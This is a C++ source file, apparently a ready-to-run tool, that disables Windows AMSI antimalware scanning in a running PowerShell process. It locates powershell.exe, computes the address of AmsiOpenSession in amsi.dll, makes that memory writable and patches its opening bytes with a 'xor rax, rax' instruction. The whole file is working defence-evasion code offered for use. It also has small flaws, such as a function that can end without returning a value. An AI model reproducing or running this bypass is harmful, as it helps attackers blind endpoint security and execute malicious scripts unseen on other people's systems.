# Credit for finding this method: https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/

#include <Windows.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <iostream>

DWORD FindProcID(const wchar_t* procname);
LPVOID getModuleBaseAddress(const wchar_t* lpsBaseName, DWORD offset, HANDLE hProcess);

int main() {

    // Find PowerShell.exe PID
    DWORD pid = 0;
    pid = FindProcID(L"powershell.exe");
    printf("[+] PowerShell.exe PID: %d\n", pid);

    // Open a handle to remote process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    printf("[+] Handle to powershell.exe: 0x%p\n", hProcess);

    // locate the base address for amsi.dll inside the remote process
    // looks like it will loaded at the same base address in every process so we can probably remote this
    LPVOID BaseAddr = getModuleBaseAddress(L"amsi.dll", 0, hProcess);
    printf("[+] Amsi.dll base address in remote process: 0x%p\n", BaseAddr);

    // Load amsi.dll into our process and find the address of AmsiOpenSession()
    HMODULE hModule = LoadLibraryEx(L"amsi.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    printf("[+] Amsi.dll base address in our process: 0x%p\n", hModule);

    LPVOID AmsiOpenSession = GetProcAddress(hModule, "AmsiOpenSession");
    printf("[+] Amsi!AmsiOpenSession function address in our process: 0x%p\n", AmsiOpenSession);
    
    // In case AMSI.dll will loaded at different base address calculate the AmsiOpenSession() address in remote process
    LPVOID targetFuncAddress = (LPVOID)((DWORD_PTR)AmsiOpenSession - (DWORD_PTR)hModule + (DWORD_PTR)BaseAddr);
    printf("[+] Amsi!AmsiOpenSession function address in remote process: 0x%p\n", targetFuncAddress);

    // Update the memory protection - we need WRITE accesss to overwrite the AmsiOpenSession() bytes
    DWORD oldProtection = 0;
    BOOL isProtected = VirtualProtectEx(hProcess, targetFuncAddress, 0x50, PAGE_READWRITE, &oldProtection);
    printf("[+] Updated memory protection to PAGE_READWRITE\n");

    // prepare payload: we want XOR RAX, RAX instead of original TEST RDX, RDX
    BYTE payload[] = { 0x48, 0x31, 0xc0 };
    // overwrite the OpenSessionAmsi() functions in PowerShell.exe
    WriteProcessMemory(hProcess, targetFuncAddress, payload, sizeof(payload), NULL);
    printf("[+] Overwrote OpenAmsiSession() bytes in remote process.\n");

    // restore orifinal memory protection
    isProtected = VirtualProtectEx(hProcess, targetFuncAddress, 0x50, oldProtection, &oldProtection);
    printf("[+] Restored original memory protection inside amsi.dll\n");

    CloseHandle(hProcess);
    CloseHandle(hModule);
    return 0;
}

DWORD FindProcID(const wchar_t* procname)
{
    int pid = 0;

    // Locate PowerShell.exe process PID
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    BOOL bResult = Process32First(hSnapshot, &pe);

    while (bResult) {
        if (wcscmp(procname, pe.szExeFile) == 0) {
            pid = pe.th32ProcessID;
            break;
        }

        bResult = Process32Next(hSnapshot, &pe);
    }

    CloseHandle(hSnapshot);
    return pid;
}

// https://progamercity.net/c-code/363-c-how-get-correct-window-handle.html

LPVOID getModuleBaseAddress(const wchar_t* lpsBaseName, DWORD offset, HANDLE hProcess) {

    HMODULE hMods[1024];
    DWORD cbNeeded;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        for (unsigned int i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            TCHAR szModName[200];
            if (GetModuleBaseName(hProcess, hMods[i], szModName, sizeof(szModName) / sizeof(TCHAR)))
            {
                if (wcscmp(lpsBaseName, szModName) == 0) {
                    return (LPVOID)(hMods[i] + offset);
                }
            }
        }
    }
}
